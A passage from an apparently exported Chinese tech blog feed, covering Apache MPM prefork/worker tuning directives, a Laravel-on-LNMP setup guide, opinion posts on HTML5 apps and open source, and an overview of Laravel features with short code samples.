<h2 id="MPM-概述"><a href="#MPM-概述" class="headerlink" title="MPM 概述"></a>MPM 概述</h2><p>这个多路处理模块 (MPM) 实现了一个非线程型的、预派生的 web 服务器，它的工作方式类似于 Apache 1.3。它适合于没有线程安全库，需要避免线程兼容性问题的系统。</p>
<p>它是要求将每个请求相互独立的情况下最好的 MPM，这样若一个请求出现问题就不会影响到其他请求。</p>
<p>这个 MPM 具有很强的自我调节能力，只需要很少的配置指令调整。最重要的是将 <code>MaxClients</code> 设置为一个足够大的数值以处理潜在的请求高峰，同时又不能太大，以致需要使用的内存超出物理内存的大小。</p>
<h5 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h5><p>一个单独的控制进程 (父进程) 负责产生子进程，这些子进程用于监听请求并作出应答。</p>
<p>Apache 总是试图保持一些备用的 (spare) 或者是空闲的子进程用于迎接即将到来的请求。这样客户端就不需要在得到服务前等候子进程的产生。</p>
<p>StartServers, MinSpareServers, MaxSpareServers, <code>MaxClients</code> 指令用于调节父进程如何产生子进程。</p>
<p>通常情况下 Apache 具有很强的自我调节能力，所以一般的网站不需要调整这些指令的默认值。可 能需要处理最大超过 256 个并发请求的服务器可能需要增加 <code>MaxClients</code> 的值。</p>
<p>内存比较小的机器则需要减少 <code>MaxClients</code> 的值以保证服务器不 会崩溃。更多关于调整进程产生的问题请参见性能方面的提示。</p>
<p>在 Unix 系统中，父进程通常以 root 身份运行以便 邦定 80 端口，而 Apache 产生的子进程通常以一个低特权的用户运行。</p>
<p>User 和 Group 指令用于设置子进程的低特权用户。运行子进程的用户必须要对 它所服务的内容有读取的权限，但是对服务内容之外的其他资源必须拥有尽可能少的权限。</p>
<p><code>MaxRequestsPerChild</code> 指令控制服务器杀死旧进程产生新进程的频率。</p>
<h2 id="Apache-MPM-worker-支持混合的多线程多进程的多路处理模块概述"><a href="#Apache-MPM-worker-支持混合的多线程多进程的多路处理模块概述" class="headerlink" title="Apache MPM worker 支持混合的多线程多进程的多路处理模块概述"></a>Apache MPM worker 支持混合的多线程多进程的多路处理模块概述</h2><p>此多路处理模块 (MPM) 使网络服务器支持混合的多线程多进程。由于使用线程来处理请求，所以可以处理海量请求，而系统资源的开销小于基于进程的 MPM。但是，它也使用了多进程，每个进程又有多个线程，以获得基于进程的 MPM 的稳定性。</p>
<p>控制这个 MPM 的最重要的指令是，控制每个子进程允许建立的线程数的 <code>ThreadsPerChild</code> 指令，和控制允许建立的总线程数的 MaxClients 指令。</p>
<h4 id="工作方式-1"><a href="#工作方式-1" class="headerlink" title="工作方式"></a>工作方式</h4><p>每个进程可以拥有的线程数量是固定的。服务器会根据负载情况增加或减少进程数量。一个单独的控制进程 (父进程) 负责子进程的建立。每个子进程可以建立 <code>ThreadsPerChild</code> 数量的服务线程和一个监听线程，该监听线程监听接入请求并将其传递给服务线程处理和应答。</p>
<p>Apache 总是试图维持一个备用 (spare) 或是空闲的服务线程池。这样，客户端无须等待新线程或新进程的建立即可得到处理。初始化时建立的进程数量由 <code>StartServers</code> 指令决定。</p>
<p>随后父进程检测所有子进程中空闲线程的总数，并新建或结束子进程使空闲线程的总数维持在 MinSpareThreads 和 MaxSpareThreads 所指定的范围内。由于这个过程是自动调整的，几乎没有必要修改这些指令的缺省值。</p>
<p>可以并 行处理的客户端的最大数量取决于 MaxClients 指令。活动子进程的最大数量取决于 MaxClients 除以 <code>ThreadsPerChild</code> 的值。</p>
<p>有 两个指令设置了活动子进程数量和每个子进程中线程数量的硬限制。要想改变这个硬限制必须完全停止服务器然后再启动服务器 (直接重启是不行 的)，ServerLimit 是活动子进程数量的硬限制，它必须大于或等于 <code>MaxClients</code> 除以 <code>ThreadsPerChild</code> 的值。 </p>
<p><code>ThreadLimit</code> 是所有服务线程总数的硬限制，它必须大于或等于 <code>ThreadsPerChild</code> 指令。这两个指令必须出现在其他 <code>workerMPM</code> 指令的前面。</p>
<p>在设置的活动子进程数量之外，还可能有额外的子进程处于 “正在中止” 的状态但是其中至少有一个服务线程仍然在处理客户端请求，直到到达 <code>MaxClients</code> 以致结束进程，虽然实际数量会很小。这个行为能够通过以下禁止特别的子进程中止的方法来避免：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">* </span>将MaxRequestsPerChild设为&quot;0&quot;</span><br><span class="line"><span class="bullet">* </span>将MaxSpareThreads和MaxClients设为相同的值</span><br></pre></td></tr></table></figure>

<p>一个典型的针对 workerMPM 的配置如下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ServerLimit</span> <span class="number">16</span></span><br><span class="line"><span class="attribute">StartServers</span> <span class="number">2</span></span><br><span class="line"><span class="attribute">MaxClients</span> <span class="number">150</span></span><br><span class="line"><span class="attribute">MinSpareThreads</span> <span class="number">25</span></span><br><span class="line"><span class="attribute">MaxSpareThreads</span> <span class="number">75</span></span><br><span class="line"><span class="attribute">ThreadsPerChild</span> <span class="number">25</span></span><br></pre></td></tr></table></figure>

<p>在 Unix 中，为了能够绑定 80 端口，父进程一般都是以 root 身份启动，随后，Apache 以较低权限的用户建立子进程和线程。User 和 Group 指令 用于设置 Apache 子进程的权限。</p>
<p>虽然子进程必须对其提供的内容拥有读权限，但应该尽可能给予它较少的特权。另外，除非使用了 suexec ，否则，这些指令设置的权限将被 CGI 脚本所继承。</p>
<p><code>MaxRequestsPerChild</code> 指令用于控制服务器建立新进程和结束旧进程的频率。</p>
<p>常用指令：</p>
<p><code>StartServers</code> 指令 <code>StartServers</code> 指令设置了服务器启动时建立的子进程数量。因为子进程数量动态的取决于负载的轻重，所有一般没有必要调整这个参数。</p>
<p><code>MinSpareServers</code> 指令 <code>MinSpareServers</code> 指令设置空闲子进程的最小数量。</p>
<p>所谓空闲子进程是指没有正在处理请求的子进程。如果当前空闲子进程数少于 <code>MinSpareServers</code> ，那么 Apache 将以最大每秒一个的速度产生新的子进程。 </p>
<p>只有在非常繁忙机器上才需要调整这个参数。将此参数设的太大通常是一个坏主意。</p>
<p><code>MaxSpareServers</code> 指令 <code>MaxSpareServers</code> 指令设置空闲子进程的最大数量。所谓空闲子进程是指没有正在处理请求的子进程。如果当前有超过 <code>MaxSpareServers</code> 数量的空闲子进程，那么父进程将杀死多余的子进程。 </p>
<p>只有在非常繁忙机器上才需要调整这个参数。将此参数设的太大通常是一个坏主意。如果你将该指令的值设置为比 <code>MinSpareServers</code> 小，Apache 将会自动将其修改成 “MinSpareServers+1”。</p>
<p><code>MaxClients</code> 指令 <code>MaxClients</code> 指令设置了允许同时伺服的最大接入请求数量。任何超过 <code>MaxClients</code> 限制的请求都将进入等候队列，直到达到 ListenBacklog 指令限制的最大值为止。一旦一个链接被释放，队列中的请求将得到服务。 </p>
<p>对于非线程型的 MPM (也就是 prefork)<code>，MaxClients</code> 表示可以用于伺服客户端请求的最大子进程数量，默认值是 256。要增大这个值，你必须同时增大 <code>ServerLimit</code> 。 </p>
<p>对 于线程型或者混合型的 MPM (也就是 beos 或 worker)<code>，MaxClients</code> 表示可以用于伺服客户端请求的最大线程数量。</p>
<p>线程型的 beos 的默认 值是 50。对于混合型的 MPM 默认值是 16 (ServerLimit) 乘以 25 (ThreadsPerChild) 的结果。</p>
<p>因此要将 <code>MaxClients</code> 增加到超过 16 个进程才能提供的时候，你必须同时增加 ServerLimit 的值。</p>
<p><code>MaxRequestsPerChild</code> 指令 <code>MaxRequestsPerChild</code> 指令设置每个子进程在其生存期内允许伺服的最大请求数量。</p>
<p>到达 <code>MaxRequestsPerChild</code> 的限制后，子进程将会结束。如果 <code>MaxRequestsPerChild</code> 为 “0”，子进程将永远不会结束。</p>
<p>不同的默认值 在 mpm_netware 和 mpm_winnt 上的默认值是 “0”。 将 <code>MaxRequestsPerChild</code> 设置成非零值有两个好处： * 可以防止 (偶然的) 内存泄漏无限进行，从而耗尽内存。 </p>
<p>给进程一个有限寿命，从而有助于当服务器负载减轻的时候减少活动进程的数量。</p>
<blockquote>
<p>注意： 对于 <code>KeepAlive</code> 链接，只有第一个请求会被计数。事实上，它改变了每个子进程限制最大链接数量的行为。</p>
</blockquote>
<p><code>ThreadsPerChild</code> 指令 这 个指令设置了每个子进程建立的线程数。子进程在启动时建立这些线程后就不再建立新的线程了。</p>
<p>如果使用一个类似于 mpm_winnt 只有一个子进程的 MPM，这个数值要足够大，以便可以处理可能的请求高峰。</p>
<p>如果使用一个类似于 worker 有多个子进程的 MPM，每个子进程所拥有的所有线程的总数要足够 大，以便可以处理可能的请求高峰。</p>
<p>对于 <code>mpm_winnt，ThreadsPerChild</code> 的默认值是 64；对于其他 MPM 是 25。</p>
<p>ThreadLimit 指令 这个指令设置了每个子进程可配置的线程数 <code>ThreadsPerChild</code> 上限。</p>
<p>任何在重启期间对这个指令的改变都将被忽略，但对 <code>ThreadsPerChild</code> 的修改却会生效。 使 用这个指令时要特别当心。</p>
<p>如果将 ThreadLimit 设置成一个高出 <code>ThreadsPerChild</code> 实际需要很多的值，将会有过多的共享内存被分配。</p>
<p>如果将 <code>ThreadLimit</code> 和 ThreadsPerChild 设置成超过系统的处理能力，Apache 可能无法启动，或者系统将变得不稳定。</p>
<p>该指令的值应 当和 <code>ThreadsPerChild</code> 可能达到的最大值保持一致。 对于 <code>mpm_winnt，ThreadLimit</code> 的默认值是 1920；对于其他 MPM 这个值是 64。 </p>
<p>注意： Apache 在编译时内部有一个硬性的限制 “ThreadLimit 20000”(对于 mpm_winnt 是 “ThreadLimit 15000”)，你不能超越这个限制。</p>
<p><code>ServerLimit</code> 指令 对 于 preforkMPM，这个指令设置了 <code>MaxClients</code> 最大允许配置的数值。</p>
<p>对于 workerMPM，这个指令和 <code>ThreadLimit</code> 结合使用设 置了 <code>MaxClients</code> 最大允许配置的数值。</p>
<p>任何在重启期间对这个指令的改变都将被忽略，但对 <code>MaxClients</code> 的修改却会生效。 使用这个指令时要特别当心。</p>
<p>如果将 ServerLimit 设置成一个高出实际需要许多的值，将会有过多的共享内存被分配。如果将 ServerLimit 和 <code>MaxClients</code> 设置成超过系统的处理能力，Apache 可能无法启动，或者系统将变得不稳定。 </p>
<p>对于 preforkMPM，只有在你需要将 <code>MaxClients</code> 设置成高于默认值 256 的时候才需要使用这个指令。要将此指令的值保持和 <code>MaxClients</code> 一样。 </p>
<p>对于 workerMPM，只有在你需要将 <code>MaxClients</code> 和 <code>ThreadsPerChild</code> 设置成需要超过默认值 16 个子进程的时候才需要使用这个指令。</p>
<p>不要将该指令的值设置的比 <code>MaxClients</code> 和 <code>ThreadsPerChild</code> 需要的子进程数量高。 </p>
<blockquote>
<p>注意： Apache 在编译时内部有一个硬限制 “ServerLimit 20000”(对于 preforkMPM 为 “ServerLimit 200000”)。你不能超越这个限制。</p>
</blockquote>
<h2 id="配置-apache-使用-workerMPM："><a href="#配置-apache-使用-workerMPM：" class="headerlink" title="配置 apache 使用 workerMPM："></a>配置 apache 使用 workerMPM：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> httpd-2.0.55</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make clean</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vi server/mpm/worker/worker.c</span> </span><br></pre></td></tr></table></figure>

<ol>
<li>修改 define DEFAULT_THREAD_LIMIT 64 为 100 即 &#x3D; 你要设置的 <code>ThreadsPerChild</code> 的值（修改默认 <code>ThreadsPerChild</code> ） </li>
<li>修改 define DEFAULT_SERVER_LIMIT 16 为 25 即 &#x3D; 你要设置的 <code>ServerLimit</code> 值（修改默认 <code>ServerLimit</code> 值） <code>:wq</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure --prefix=/usr/local/apache --with-mpm=worker</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make install</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> /usr/local/apache/conf</span> </span><br></pre></td></tr></table></figure></li>
</ol>
<p><code>vi httpd.conf</code> 修改 </p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;IfModule worker.c&gt;</span></span><br><span class="line"><span class="attribute">StartServers</span> <span class="number">2</span></span><br><span class="line"><span class="attribute">MaxClients</span> <span class="number">150</span></span><br><span class="line"><span class="attribute">MinSpareThreads</span> <span class="number">25</span></span><br><span class="line"><span class="attribute">MaxSpareThreads</span> <span class="number">75</span></span><br><span class="line"><span class="attribute">ThreadsPerChild</span> <span class="number">25</span></span><br><span class="line"><span class="attribute">MaxRequestsPerChild</span> <span class="number">0</span></span><br><span class="line"><span class="section">&lt;/IfModule&gt;</span></span><br></pre></td></tr></table></figure>
<p>内容为</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;IfModule worker.c&gt;</span></span><br><span class="line"><span class="attribute">StartServers</span> <span class="number">3</span></span><br><span class="line"><span class="attribute">MaxClients</span> <span class="number">2000</span></span><br><span class="line"><span class="attribute">ServerLimit</span> <span class="number">25</span></span><br><span class="line"><span class="attribute">MinSpareThreads</span> <span class="number">50</span></span><br><span class="line"><span class="attribute">MaxSpareThreads</span> <span class="number">200</span></span><br><span class="line"><span class="attribute">ThreadLimit</span> <span class="number">200</span></span><br><span class="line"><span class="attribute">ThreadsPerChild</span> <span class="number">100</span></span><br><span class="line"><span class="attribute">MaxRequestsPerChild</span> <span class="number">0</span></span><br><span class="line"><span class="section">&lt;/IfModule&gt;</span></span><br></pre></td></tr></table></figure>

<p>修改 serveradmin servername 等信息为正确配置 :wq </p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">$ <span class="regexp">/usr/</span>local<span class="regexp">/apache/</span>bin/apachectl start </span><br><span class="line">$ vi <span class="regexp">/etc/</span>rc.loacl  <span class="regexp">//</span>添加 </span><br><span class="line">$ <span class="regexp">/usr/</span>local<span class="regexp">/apache/</span>bin/apachectl start</span><br></pre></td></tr></table></figure>

<p>PS: 用 <code>netstat -an|grep ESTABLISHED|grep 202.100.85.249:80 |wc -l</code> 看连接数，使用 worker 模式后，httpd 进程数变少不能反映 tcp 连接数</p>
]]></content>
      <categories>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>ab</tag>
        <tag>MPM</tag>
      </tags>
  </entry>
  <entry>
    <title>Lnmp 架设 Laravel 框架</title>
    <url>/2016/08/lnmp-laravel/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>这个问题耗费我三天时间和精力，刚开始出现 <code>php -r</code> 错误和 PHP 的一些命令错误。</p>
<p>我怀疑是 <code>composer</code> 的配置有问题，后来仔细研究和找文档才找到问题。</p>
<span id="more"></span>

<h2 id="1-Php-扩展配置"><a href="#1-Php-扩展配置" class="headerlink" title="1. Php 扩展配置"></a>1. Php 扩展配置</h2><p><code>php.ini</code> 里去个 <code>proc_open</code> 和 <code>proc_get_status</code> 函数，重启一下 php-fpm</p>
<p>安装 <code>composer create-project laravel/laravel/home/wwwroot/www.vpser.net/</code></p>
<p>添加虚拟主机目录指定到 <code>/home/wwwroot/www.vpser.net/public</code></p>
<h2 id="2-Nginx-配置重定向"><a href="#2-Nginx-配置重定向" class="headerlink" title="2. Nginx 配置重定向"></a>2. Nginx 配置重定向</h2><p>该虚拟主机加上个伪静态 </p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>//index.php?<span class="variable">$query_string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重启一下 nginx</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nginx -s reload</span></span><br></pre></td></tr></table></figure>

<h2 id="3-Linux-设置权限"><a href="#3-Linux-设置权限" class="headerlink" title="3. Linux 设置权限"></a>3. Linux 设置权限</h2><p>设置一下目录权限</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chow www:www -R <span class="regexp">/home/</span>wwwroot<span class="regexp">/www.vpser.net/</span>chmod <span class="number">755</span> -R <span class="regexp">/home/</span>wwwroot<span class="regexp">/www.vpser.net/</span></span><br></pre></td></tr></table></figure>

<p>官网上有详细的文档说明：<span class="exturl" data-url="aHR0cHM6Ly9sYXJhdmVsLmNvbS9kb2NzLzUuMg==">https://laravel.com/docs/5.2<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>Lnmp</tag>
        <tag>Laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>为什么 HTML5 APP 能在 2015 年火起来？</title>
    <url>/2016/08/html5-app/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>HTML5做跨平台的APP，在大多数人的脑子里没有什么好感，我身边的朋友也这么说。Anyway，我用完以后得出这样的结论：HTML5跨平台APP开发，在2015年以后会越来越火。</p>
<p>在2014年以前，HTML5的性能和能力都不够充足。特别是性能，因为Android4.4以下版本不能支持webGL技术，所以大部分低端Android手机无法流畅运行手机APP。</p>
<span id="more"></span>

<p>DCloud公司利用一款增强版的手机浏览器缓解了这个问题。同时，随着时代的进步，Android4.4以下版本将逐渐减少。</p>
<h2 id="2014-年-H5-没火，WHY"><a href="#2014-年-H5-没火，WHY" class="headerlink" title="2014 年 H5 没火，WHY"></a>2014 年 H5 没火，WHY</h2><p>HTML5开发的APP在安卓4.4以下版本无法流畅运行，带来很差的用户体验。在目前iOS版本的手机则不存在这种问题。</p>
<p>究其原因，是 Android4.4 以下版本内置的 webview 版本太低，不支持 webGL 加速技术。近几年，HTML5 开发 APP 无法普及，因为 Android4.4 以下版本市场占有率高企。</p>
<p>但是，从 2013 开始，Android4.4 以下版本正在逐步减少，这将对使用 HTML5 开发 APP 形成有利条件。</p>
<h2 id="2015年11月，Android手机版本分布情况。"><a href="#2015年11月，Android手机版本分布情况。" class="headerlink" title="2015年11月，Android手机版本分布情况。"></a>2015年11月，Android手机版本分布情况。</h2><p>目前，在4.4以上（含4.4）版本已经有57.47%的占有率，而且，5.0以上版本的占有率（目前已有8.64%）有快速增加的趋势。未来，4.4以上（含4.4）版本将是Android市场的主流版本，这一事件正在发生。</p>
<h2 id="2014-2015年，Android手机部分版本变换趋势。"><a href="#2014-2015年，Android手机部分版本变换趋势。" class="headerlink" title="2014-2015年，Android手机部分版本变换趋势。"></a>2014-2015年，Android手机部分版本变换趋势。</h2><p>Android手机部分版本的变化趋势。可以看出：4.4.4和4.4.2版本在快速扩张以后，目前增速放缓；4.4以下版本仍继续减少，并无停止迹象。</p>
<p>同时，“其他”一类的占有率正在提高，并已超过4.4.2版本的占有率，有望赶上4.4.4版本的占有率。在“其他”的增长过程中，包含了4.4.4以上版本的快速增加，并且以5.0以上版本的持续增加为主。</p>
<h2 id="2015-年-H5-会火，WHY"><a href="#2015-年-H5-会火，WHY" class="headerlink" title="2015 年 H5 会火，WHY"></a>2015 年 H5 会火，WHY</h2><p>分析完Android版本分布，我认为：HTML5开发APP的前景十分好，以后HTML5 APP将能自己适应目前的市场，不再有性能问题。</p>
<p>同时，对于iOS操作系统及iPhone手机，不必担心性能问题，iOS端本身对HTML5的支持就很好。</p>
<h2 id="先发制人"><a href="#先发制人" class="headerlink" title="先发制人"></a>先发制人</h2><p>HTML5跨平台APP越来越火，工具也越来越多。我推荐一个开发平台（一款工具）—-DCloud。</p>
<p>DCloud公司四款产品——HBuilder、HTML5+ Runtime、MUI、流应用。</p>
<p>HBuilder是一款前端开发工具，里面内置大量快捷键，飞速编码，一款不错的极客工具。</p>
<p>HTML5+ Runtime是一款手机浏览器，是依照DCloud公司的HTML5+标准实现的增强版浏览器，用于跨平台开发。</p>
<p>该浏览器可以解析HTM5+ 规范的代码，跑在iOS和Android端，这样一套代码就可以在两个平台上运行。</p>
<p>MUI是一款前端框架，专门用于制作手机APP，功能和Android原生UI库、iOS原生UI库、JQuery Mobile、Zepto等框架类似。</p>
<p>这是DCloud公司出品，用于和HTML5+ Runtime配套使用，可以使HTML5+ APP流畅跑在IOS和Android端手机上。MUI还是一款高大上的UI框架，其风格是模仿IOS 7界面风格的产品。</p>
<p>流应用是一种发行APP的方式，能让用户秒下、秒开手机APP，同时可以生产6个渠道的包【iOS ipa、Android apk、360流应用市场、百度直达号、H5浏览器、微信APP】。</p>
<p>参考资料：HTML5 APP—-DCloud 产品分析及介绍。</p>
]]></content>
      <categories>
        <category>Html5</category>
      </categories>
      <tags>
        <tag>DCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>开源观点</title>
    <url>/2016/08/open-source/</url>
    <content><![CDATA[<h2 id="开源观点"><a href="#开源观点" class="headerlink" title="开源观点"></a>开源观点</h2><p>上次博客写道 <code>Vim</code> 的折腾和 <code>PhpStorm</code> 的好处，决定好好里用 <code>PhpStorm</code> 开发 <code>laravel</code> 项目！</p>
<p>之前不知道就听说 <code>PhpStorm</code> 能打开远程项目，一直没试过今天仔细瞅瞅，发现不但能打开局域网内项目，还能代开 <code>Linux</code> 上的项目！</p>
<span id="more"></span>

<p>局域网类这样打开项目，<code>Windows</code> 资源管理器里有个映射网络驱动器的功能，将你这个共享地址映射为一个磁盘，就可以当作本地打开了</p>
<p><code>Linux</code> 项目这样打开和编辑远程项目，<span class="exturl" data-url="aHR0cDovL2ppbmd5YW4uYmFpZHUuY29tL2FydGljbGUvODZmNGE3M2U4MzcyNGEzN2Q3NTI2OTdkLmh0bWw=">FTP项目<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9zaGFveWlrYWkvcC80MzgxNjQyLmh0bWw=">远程项目<i class="fa fa-external-link-alt"></i></span></p>
<p>至此我想起来开源的好处，操作系统有 <code>Windows Linux Unix</code> 等，WEB 服务器有 <code>Tomcat Nginx Apache IIS</code> 等，数据库有 <code>Oracle Redis Mysql SqlServer</code> 等，编程语言有 <code>JAVA Ruby PHP Python</code> 等。</p>
<p>每个程序员都可以自由选择操作系统和 <code>WEB</code> 服务器，数据库，编程语言等，因为 <code>MySQL</code> 和 <code>PHP</code> 相互支持较好，所以导致 <code>PHP</code> 越来越流行的原因吧！ </p>
<p>这些开源工具可以自由组合，自由结合，自由匹配，比较有名的如 <code>wamp lamp wnmp lnmp xampp</code> 等等，充分说明一点开源的东西是最经得起打击的，生命力最强的。</p>
]]></content>
      <categories>
        <category>OpenSource</category>
      </categories>
  </entry>
  <entry>
    <title>为什么 Laravel 会成为最成功的 PHP 框架</title>
    <url>/2016/08/php-laravel/</url>
    <content><![CDATA[<h2 id="模块化和可扩展性"><a href="#模块化和可扩展性" class="headerlink" title="模块化和可扩展性"></a>模块化和可扩展性</h2><p>Laravel 注重代码的模块化和可扩展性。你可以在包含超过 5500 个程序包的 Packalyst 目录中找到你想要添加的任何文件。</p>
<p>Laravel 的目标是让你能够找到任何想要的文件。</p>
<span id="more"></span>

<h2 id="微服务和程序接口"><a href="#微服务和程序接口" class="headerlink" title="微服务和程序接口"></a>微服务和程序接口</h2><p>Lumen 是一个由 laravel 衍生的专注于精简的微框架。它高性能的程序接口可让你更加简单快速的开发微型项目。</p>
<p>Lumen 使用最小的配置集成了所有 laravel 的重要特性，你可以通过将代码复制到 laravel 项目的方式将完整的框架迁移过来。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$app</span>-&gt;<span class="title function_ invoke__">get</span> (<span class="string">&#x27;/&#x27;</span>, function () &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">view</span> (<span class="string">&#x27;lumen&#x27;</span>); </span><br><span class="line">&#125;); </span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span>-&gt;<span class="title function_ invoke__">post</span> (<span class="string">&#x27;framework/&#123;id&#125;&#x27;</span>, function (<span class="variable">$framework</span>) &#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dispatch</span> (<span class="keyword">new</span> <span class="title class_">Energy</span> (<span class="variable">$framework</span>));</span><br><span class="line">&#125;); </span><br></pre></td></tr></table></figure>

<h2 id="HTTP-路径"><a href="#HTTP-路径" class="headerlink" title="HTTP 路径"></a>HTTP 路径</h2><p>Laravel 拥有类似于 Ruby on Rails 的，快速、高效的路由系统。它可以让用户通过在浏览器上输入路径的方式让应用程序的各部分相关联。</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">Route::<span class="keyword">get</span> (<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> <span class="params">()</span> &#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Hello World&#x27;</span>; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="HTTP-中间件"><a href="#HTTP-中间件" class="headerlink" title="HTTP 中间件"></a>HTTP 中间件</h2><p>应用程序可受到中间件的保护 —— 中间件会处理分析和过滤服务器上的 HTTP 请求。</p>
<p>你可以安装中间件，用于验证注册用户，并避免如跨站脚本 (XSS) 或其它的安全状况的问题。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Middleware</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">Closure</span>; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OldMiddleware</span> </span>&#123; </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span> (<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span> (<span class="string">&#x27;age&#x27;</span>) &lt;= <span class="number">200</span>) &#123; </span><br><span class="line">      <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span> (<span class="string">&#x27;home&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$next</span> (<span class="variable">$request</span>); </span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>你的应用程序可得到一个健壮的缓存系统，通过对其进行调整，可以让应用程序的加载更加快速，这可以给你的用户提供最好的使用体验。</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Cache</span><span class="type">::extend</span> (<span class="string">&#x27;mongo&#x27;</span>, function ($app) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">Cache</span><span class="type">::repository</span> (<span class="literal">new</span> MongoStore);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="身份验证"><a href="#身份验证" class="headerlink" title="身份验证"></a>身份验证</h2><p>安全是至关重要的。Laravel 自带对本地用户的身份验证，并可以使用 “remember” 选项来记住用户。</p>
<p>它还可以让你例如一些额外参数，例如显示是否为活跃的用户。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title class_">Auth</span>::<span class="variable constant_">attempt</span> ([<span class="string">&#x27;email&#x27;</span> =&gt; <span class="variable">$email</span>, <span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$password</span>, <span class="string">&#x27;active&#x27;</span> =&gt; <span class="number">1</span> ], <span class="variable">$remember</span>)) &#123;</span><br><span class="line">  <span class="comment">// The user is being remembered...</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="种类集成"><a href="#种类集成" class="headerlink" title="种类集成"></a>种类集成</h2><p>Laravel Cashier 可以满足你要开发支付系统所需要的一切需求。除此之外，它还同步并集成了用户身份验证系统。</p>
<p>所以，你不再需要担心如何将计费系统集成到开发当中了。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = User::<span class="built_in">find</span> (1);</span><br><span class="line"><span class="variable">$user</span>-&gt;subion (<span class="string">&#x27;monthly&#x27;</span>)-&gt;create(<span class="variable">$creditCardToken</span>);</span><br></pre></td></tr></table></figure>

<h2 id="任务自动化"><a href="#任务自动化" class="headerlink" title="任务自动化"></a>任务自动化</h2><p>Elixir 是一个可让我们使用 Gulp 定义任务的 Laravel 程序接口，我们可以使用 Elixir 定义可精简 CSS 和 Java 的预处理器。</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">elixir (<span class="name">function</span> (<span class="name">mix</span>) &#123;</span><br><span class="line">  mix.browserify (&#x27;main.js&#x27;)<span class="comment">;</span></span><br><span class="line">&#125;)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>一个安全的应用程序应该做到可把数据进行加密。使用 Laravel，可以启用 OpenSSL 安全加密算法 AES-256-CBC 来满足你所有的需求。</p>
<p>另外，所有的加密值都是由检测加密信息是否被改变的验证码所签署的。</p>
